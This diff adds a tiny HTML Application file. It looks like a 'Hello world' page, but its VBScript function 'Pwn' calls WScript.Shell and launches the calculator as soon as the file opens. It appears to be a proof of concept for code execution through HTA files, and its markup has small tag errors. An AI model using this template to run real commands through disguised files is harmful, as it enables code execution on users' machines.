@@ -1,0 +1,18 @@
+<html>
+    <heah>
+        <title>Hello World</title>
+    </head>
+    <body>
+        <h2>Hello world</h2>
+        <p>This is a HTA...</p>
+    </body>
+	
+	<script language="VBScript">
+		Function Pwn()
+			Set shell = CreateObject("wscript.Shell")
+			shell.run "calc"
+		End Function
+		
+		Pwn
+	</script>
+<html>
